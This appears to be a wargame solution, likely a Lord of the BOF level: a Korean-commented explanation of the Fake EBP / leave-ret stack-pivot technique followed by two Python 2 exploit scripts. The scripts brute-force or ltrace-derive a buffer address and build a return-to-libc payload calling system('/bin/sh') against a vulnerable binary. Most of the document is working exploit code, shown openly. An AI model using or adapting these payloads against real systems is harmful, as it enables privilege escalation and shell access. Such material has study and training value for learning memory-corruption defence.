'''
* leave,ret가젯 이용

 leave
 mov esp ebp
 pop ebp

 ret
 pop eip
 jmp eip

 => 이 원리를 이용해서 Fake EBP기법을 사용
 -> buf / sfp / ret 의 스택 구조를 buf / sfp(&buf) / ret(leave,ret가젯)

 sfp에 ebp를 변조를 해놓고 leave를 수행하면,
 mov esp ebp  <=  esp와 ebp가 같은 위치로 변경
 pop ebp      <=  현재 esp가 가리키는 주소로 ebp를 보내고 pop을 해서 esp는 주소를 +4 해서 ret을 가르킴.

 ret가 수행될 때,
 pop eip      <=  esp가 가리키는 주소를 eip로 하고 pop을 해서 esp주소를 +4
 jmp eip      <=  eip가 가리키는 변조된 주소로 jmp
 
이 원리를 이용함.

"abcd" + system() + exit() + argv("/bin/sh") + "\x90"*24 + sfp + leave,ret 가젯

'''

import os,sys,struct

target=os.getcwd()+"/"+sys.argv[1]

system=0x40058ae0
exit=0x400391e0
bin=0x400fbff9
sfp=0xbffffaa0
ret=0x80484df

for h in range(0xff,0x00,-1):
	for l in range(0x00,0x100,1):
		payload="abcd"+struct.pack('<L',system)
		payload=payload+struct.pack('<L',exit)
		payload=payload+struct.pack('<L',bin)
		payload=payload+"\x90"*(40-len(payload))
		payload=payload+chr(l)+chr(h)+"\xff\xbf"
		payload=payload+struct.pack('<L',ret)
		pid=os.fork()
		if pid==0:
			os.execl(target,target,payload)
		else:
			os.waitpid(pid,0)



#========================================================================================================


import os,sys,struct,re

def AddrCalc(str):					#주소값(16진수 8비트)를 입력받아 10진수로 변환하고 더해서 주소를 구해줌
	i=7
	sum=0L
	for x in str:
		tmp=0L
		if x=='a':	calc=10
		elif x=='b':	calc=11
		elif x=='c':	calc=12
		elif x=='d':	calc=13
		elif x=='e':	calc=14
		elif x=='f':	calc=15
		else:	calc=int(x)
		if i==0:
			sum=sum+calc
		else:
			tmp=16**i			#16승이라 16의 제곱을 구해줌
			tmp=long(tmp)*long(calc)	#위에서 구한 값과 16진수 한자리 수를 곱함
			sum=sum+tmp
		i=i-1
	return sum

def GetBuf():
	bufaddr=0
	os.system("ltrace ./assassin_zombie `python -c \'print \"A\"*48\'` 2>buf.txt")	#ltrace명령으로 strncpy 검색
	fp = open("./buf.txt",'r')
	result=fp.read()
	fp.close()
	os.unlink('buf.txt')
	buflist=re.findall('strncpy\(\w*',result)
	buflist=re.findall('0x\w*',buflist[0])
	bufaddr=AddrCalc(buflist[0][2:])
	return bufaddr

target=os.getcwd()+"/"+sys.argv[1]

system=0x40058ae0
exit=0x400391e0
bin=0x400fbff9
ret=0x80484df
buf=GetBuf()
print buf

payload=struct.pack("<L",system)+struct.pack("<L",exit)+struct.pack("<L",bin)
payload=payload+"\x90"*(40-len(payload))
payload=payload+struct.pack("<L",buf-0x4)+struct.pack("<L",ret)
pid = os.fork()
if pid==0:
        os.execv(target,('lhj',payload))
else:
        os.waitpid(pid,0)
